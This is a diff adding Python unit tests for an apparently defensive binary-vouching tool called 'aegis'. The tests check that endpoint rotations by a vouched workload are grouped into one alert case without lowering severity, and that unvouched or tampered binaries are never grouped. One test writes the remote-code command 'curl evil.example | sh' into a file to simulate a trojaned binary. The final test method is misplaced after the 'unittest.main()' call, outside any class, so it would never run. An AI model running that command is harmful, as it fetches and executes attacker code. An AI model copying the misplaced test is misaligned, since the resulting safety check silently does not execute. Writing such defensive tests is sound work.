@@ -193,5 +193,68 @@ class VouchTier(unittest.TestCase):
                 aegis._vouch_record("vouch", self.bin, _PRINCIPAL), self.key)
 
 
+@unittest.skipUnless(_have_ssh_keygen(), "ssh-keygen not available")
+class EndpointRotationBatchesIntoTheWorkloadCase(VouchTier):
+    """A vouched workload reaching an UNREVIEWED endpoint.
+
+    Binding a vouch to an exact endpoint set is right — an identity vouch that
+    widened into "may contact anything on 443" would hide the one connection
+    worth seeing. But a provider that rotates addresses then re-alerts as a
+    cold, brand-new HIGH beacon on every rotation, which is the alert fatigue
+    the precision tier exists to end and which trains the operator to silence
+    beacons by hand-editing a trust store.
+
+    So the rotation joins the workload's own case. Severity is NOT reduced —
+    nothing here decides the new endpoint is benign, only which case the
+    operator reads it in.
+    """
+
+    def test_an_unreviewed_endpoint_batches_into_the_workload_case(self):
+        self._vouch(endpoints=["20.85.130.105:443"])
+        case, note = aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443")
+        self.assertIsNotNone(case)
+        self.assertIn("vouched-endpoint:", case)
+        self.assertIn("NOT reduced", note)
+
+    def test_two_rotations_share_one_case(self):
+        """The point: N rotations are one thing to decide, not N cold alerts."""
+        self._vouch(endpoints=["20.85.130.105:443"])
+        a, _ = aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443")
+        b, _ = aegis._vouch_endpoint_deviation(self.bin, "8.9.10.11:443")
+        self.assertEqual(a, b)
+
+    def test_severity_is_never_reduced_by_a_deviation(self):
+        """Safety: batching is a RENDERING decision. `_grade_binary` must still
+        refuse to demote an endpoint the vouch does not cover."""
+        self._vouch(endpoints=["20.85.130.105:443"])
+        self.assertEqual(
+            aegis._grade_binary("HIGH", self.bin, endpoint="4.5.6.7:443")[:2],
+            ("HIGH", None))
+
+    def test_the_reviewed_endpoint_is_not_a_deviation(self):
+        self._vouch(endpoints=["20.85.130.105:443"])
+        self.assertEqual(
+            aegis._vouch_endpoint_deviation(self.bin, "20.85.130.105:443"),
+            (None, None))
+
+    def test_an_unvouched_binary_is_never_batched(self):
+        """Safety, and the whole boundary: an implant that was never vouched
+        must keep opening its own cold case per endpoint. Batching is a
+        privilege of having been signed for."""
+        self.assertEqual(
+            aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443"),
+            (None, None))
+
+
 if __name__ == "__main__":
     unittest.main()
+
+    def test_a_swapped_payload_at_a_vouched_path_is_never_batched(self):
+        """Safety: batching keys on the CONTRACT, and changed bytes escape the
+        contract. A trojaned binary at a vouched path gets no shelter."""
+        self._vouch(endpoints=["20.85.130.105:443"])
+        with open(self.bin, "a", encoding="utf-8") as f:
+            f.write("curl evil.example | sh\n")
+        self.assertEqual(
+            aegis._vouch_endpoint_deviation(self.bin, "4.5.6.7:443"),
+            (None, None))
